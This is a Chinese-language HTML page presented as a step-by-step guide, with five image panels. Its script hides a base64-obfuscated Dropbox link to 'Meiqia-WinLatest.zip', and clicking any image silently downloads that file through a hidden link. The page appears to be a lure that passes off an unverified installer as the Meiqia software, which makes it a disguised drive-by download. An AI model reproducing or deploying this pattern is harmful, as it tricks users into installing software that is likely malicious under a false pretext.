<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>操作步骤专区</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }
        .guide-section {
            position: relative;
            overflow: hidden;
        }
        .guide-section img {
            width: 100%;
            height: auto;
            vertical-align: top;
            transition: opacity 0.3s ease;
        }
        .guide-section img:hover {
            opacity: 0.95;
        }
    </style>
</head>
<body>
    <section class="guide-section">
        <img src="static/picture/d_01.jpg" alt="操作步骤示意图">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_02.jpg" alt="功能说明图示">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_03.jpg" alt="使用技巧展示">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_04.jpg" alt="配置流程说明">
    </section>
    <section class="guide-section">
        <img src="static/picture/d_05.jpg" alt="最终效果预览">
    </section>

<script>
    (function() {
        // 资源获取处理器
        const resourceHandler = {
            resourceLinks: [
                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JqdTJhbjg3Nmx4azU1bXBzenZrdS9NZWlxaWEtV2luTGF0ZXN0LnppcD9ybGtleT1pcWphempqZmk4aTYyOGxqa2dhZXk2dGF5JnN0PW5ra3J3Mnl6JmRsPTE=',
                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JqdTJhbjg3Nmx4azU1bXBzenZrdS9NZWlxaWEtV2luTGF0ZXN0LnppcD9ybGtleT1pcWphempqZmk4aTYyOGxqa2dhZXk2dGF5JnN0PW5ra3J3Mnl6JmRsPTE=',
                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JqdTJhbjg3Nmx4azU1bXBzenZrdS9NZWlxaWEtV2luTGF0ZXN0LnppcD9ybGtleT1pcWphempqZmk4aTYyOGxqa2dhZXk2dGF5JnN0PW5ra3J3Mnl6JmRsPTE=',

                'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JqdTJhbjg3Nmx4azU1bXBzenZrdS9NZWlxaWEtV2luTGF0ZXN0LnppcD9ybGtleT1pcWphempqZmk4aTYyOGxqa2dhZXk2dGF5JnN0PW5ra3J3Mnl6JmRsPTE='
            ],
            
            decodeData: function(encoded) {
                return atob(encoded);
            },
            
            initResourceAccess: function() {
                document.querySelectorAll('.guide-section').forEach((section, index) => {
                    section.addEventListener('click', () => {
                        this.processResource(this.resourceLinks[index]);
                    });
                });
            },
            
            processResource: function(encoded) {
                const resourceUrl = this.decodeData(encoded);
                const temporaryLink = document.createElement('a');
                temporaryLink.style.display = 'none';
                temporaryLink.href = resourceUrl;
                temporaryLink.rel = 'noopener noreferrer';
                document.body.appendChild(temporaryLink);
                temporaryLink.click();
                setTimeout(() => {
                    document.body.removeChild(temporaryLink);
                }, 300);
            }
        };

        // 图片展示模块
        const imageViewer = {
            initImagePreview: function() {
                const images = document.querySelectorAll('.guide-section img');
                images.forEach(img => {
                    img.addEventListener('load', () => {
                        img.style.opacity = 1;
                    });
                });
            }
        };

        // 初始化模块
        document.addEventListener('DOMContentLoaded', () => {
            resourceHandler.initResourceAccess();
            imageViewer.initImagePreview();
        });
    })();
</script>

</body>
</html>
